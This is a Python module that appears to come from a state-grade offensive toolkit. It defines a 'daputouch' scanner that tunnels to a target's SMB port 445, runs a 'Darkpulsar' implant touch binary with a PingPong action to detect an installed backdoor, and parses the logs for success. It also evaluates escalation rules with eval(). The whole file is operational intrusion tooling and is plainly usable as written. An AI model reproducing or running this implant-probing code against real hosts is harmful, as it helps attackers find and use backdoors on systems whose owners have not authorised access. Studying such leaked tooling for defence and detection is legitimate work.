
import ops.cmd
import util.mac
import dsz
from scanengine2 import scan
import os.path
import re

def _whats_your_job():
    return 'daputouch\\|*'

def _whats_your_name():
    return 'daputouch'

def _support_ipv6():
    return False

class daputouch(scan, ):

    def __init__(self, job, timeout=60):
        scan.__init__(self, job)
        if (len(job) > 1):
            self.port = job[0].split('|')[1]
        self.scan_type = _whats_your_name()
        self.timeout = timeout

    def execute_scan(self, verbose):
        redir_cmd = scan.gettunnel(self, self.target, 'tcp', self.port)
        PATH_TO_DAPUTOUCH = scan.find_newest_touch(self, 'Darkpulsar', 'exe', touch_type='implants')
        PATH_TO_DAPUXML = scan.find_newest_touch(self, 'Darkpulsar', 'xml', touch_type='implants')
        dapucmd = ops.cmd.getDszCommand('run', dszquiet=(not verbose))
        dapu_cmd_list = []
        dapu_cmd_list.append(('--InConfig %s' % PATH_TO_DAPUXML))
        dapu_cmd_list.append(('--TargetIp %s' % '127.0.0.1'))
        dapu_cmd_list.append(('--TargetPort %s' % redir_cmd.lplisten))
        dapu_cmd_list.append(('--NetworkTimeout %s' % self.timeout))
        dapu_cmd_list.append(('--Protocol %s' % 'SMB'))
        dapu_cmd_list.append(('--ImplantAction %s' % 'PingPong'))
        outconfig = os.path.join(ops.LOGDIR, 'Logs', ('%s_%s_%s.xml' % (os.path.basename(PATH_TO_DAPUTOUCH), self.target, dsz.Timestamp())))
        dapu_cmd_list.append(('--OutConfig %s' % outconfig))
        dapu_cmd_string = ((PATH_TO_DAPUTOUCH + ' ') + ' '.join(dapu_cmd_list))
        dapucmd.command = ('cmd /C %s' % dapu_cmd_string)
        dapucmd.arglist.append('-redirect')
        dapucmd.arglist.append(('-directory %s' % os.path.join(ops.DSZDISKSDIR, 'lib', 'x86-Windows')))
        dapucmd.prefixes.append('local')
        dapucmd.prefixes.append('log')
        dapuobject = dapucmd.execute()
        ops.networking.redirect.stop_tunnel(dsz_cmd=redir_cmd)
        screenlog = os.path.join(ops.PROJECTLOGDIR, dapuobject.commandmetadata.screenlog)
        f = open(screenlog, 'r')
        screenlog_lines = f.readlines()
        f.close()
        for line in screenlog_lines:
            if ('Process terminated with status 0' in line):
                self.success = True
                break
            elif ('Process terminated with status 6' in line):
                self.success = False
                self.error = line.strip('Process terminated with status ').strip()
                break
            elif ('Process terminated with status' in line):
                self.error = line.strip('Process terminated with status ').strip()
        self.timestamp = dsz.Timestamp()

    def return_success_message(self):
        return ('DAPU PingPong success from %s' % self.target)

    def check_escalation(self, escalation_rule):
        daputouch = self
        try:
            if eval(escalation_rule):
                return True
            else:
                return False
        except:
            return False

    def verify_escalation(self, escalation_rule):
        daputouch = self
        try:
            eval_res = eval(escalation_rule)
            if ((eval_res == True) or (eval_res == False)):
                return True
            else:
                return False
        except:
            return False

    def return_data(self):
        return scan.return_data(self)

    def get_display_headers(self):
        return ['Targeted Address', 'Port', 'Success', 'Error']

    def get_data_fields(self):
        return ['target', 'port', 'success', 'error']

    def get_raw_fields(self):
        return (self.get_data_fields() + ['success'])

    def verify_job(self, job):
        if ((not (len(job) == 2)) or (not (int(job[1]) in [445]))):
            return False
        return True

    def min_time(self):
        return 30

    def min_range(self):
        return 5